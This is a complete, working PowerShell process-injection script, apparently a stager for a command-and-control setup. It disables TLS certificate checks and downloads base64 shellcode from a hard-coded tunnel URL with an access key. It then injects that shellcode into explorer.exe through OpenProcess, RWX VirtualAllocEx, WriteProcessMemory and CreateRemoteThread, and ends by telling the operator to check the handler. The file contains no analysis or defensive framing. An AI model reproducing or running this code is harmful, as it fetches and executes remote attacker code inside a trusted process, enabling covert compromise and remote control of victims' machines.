# Win32 API Injection - PowerShell 5.x Compatible
# Uses standard API calls (no syscalls) for maximum compatibility

# ===== AUTO-UPDATED BY start_c2.sh =====
$scUrl = 'https://spots-benefit-herb-mods.trycloudflare.com/payloads/shellcode.txt?key=7fd57214ed9dddd9'
# =======================================

# SSL/TLS bypass for PS5
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCerts : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCerts

$code = @'
using System;
using System.Runtime.InteropServices;

public class Win32Inject {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint allocType, uint protect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr addr, byte[] buffer, uint size, out uint written);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr threadAttr, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out uint threadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr handle);
    
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
}
'@

Add-Type -TypeDefinition $code

$out = @()
$out += "[*] Win32 API Injection - PS5 Compatible"

# Download shellcode
try {
    $scB64 = (New-Object Net.WebClient).DownloadString($scUrl)
    $sc = [Convert]::FromBase64String($scB64)
    $out += "[+] Shellcode downloaded: $($sc.Length) bytes"
} catch {
    $out += "[-] Failed to download shellcode: $_"
    return ($out -join "`n")
}

# Target explorer.exe
try {
    $target = (Get-Process explorer -ErrorAction Stop)[0]
    $targetPid = $target.Id
    $out += "[*] Target: explorer.exe PID $targetPid"
} catch {
    $out += "[-] Could not find explorer.exe"
    return ($out -join "`n")
}

# Open process with all access
$hProcess = [Win32Inject]::OpenProcess(0x1F0FFF, $false, $targetPid)
if ($hProcess -eq [IntPtr]::Zero) {
    $err = [Win32Inject]::GetLastError()
    $out += "[-] OpenProcess failed: $err"
    return ($out -join "`n")
}
$out += "[+] Process handle: 0x$($hProcess.ToString('X'))"

# Allocate memory in target process (RWX)
$allocSize = [uint32]($sc.Length + 4096)
$remoteAddr = [Win32Inject]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $allocSize, 0x3000, 0x40)
if ($remoteAddr -eq [IntPtr]::Zero) {
    $err = [Win32Inject]::GetLastError()
    $out += "[-] VirtualAllocEx failed: $err"
    [Win32Inject]::CloseHandle($hProcess)
    return ($out -join "`n")
}
$out += "[+] Allocated at: 0x$($remoteAddr.ToString('X'))"

# Write shellcode
$written = [uint32]0
$result = [Win32Inject]::WriteProcessMemory($hProcess, $remoteAddr, $sc, [uint32]$sc.Length, [ref]$written)
if (-not $result) {
    $err = [Win32Inject]::GetLastError()
    $out += "[-] WriteProcessMemory failed: $err"
    [Win32Inject]::CloseHandle($hProcess)
    return ($out -join "`n")
}
$out += "[+] Written: $written bytes"

# Create remote thread
$threadId = [uint32]0
$hThread = [Win32Inject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $remoteAddr, [IntPtr]::Zero, 0, [ref]$threadId)
if ($hThread -eq [IntPtr]::Zero) {
    $err = [Win32Inject]::GetLastError()
    $out += "[-] CreateRemoteThread failed: $err"
    [Win32Inject]::CloseHandle($hProcess)
    return ($out -join "`n")
}
$out += "[+] Thread created: TID $threadId"

# Cleanup
[Win32Inject]::CloseHandle($hThread)
[Win32Inject]::CloseHandle($hProcess)

$out += ""
$out += "[+] SUCCESS! Check your handler!"

$out -join "`n"
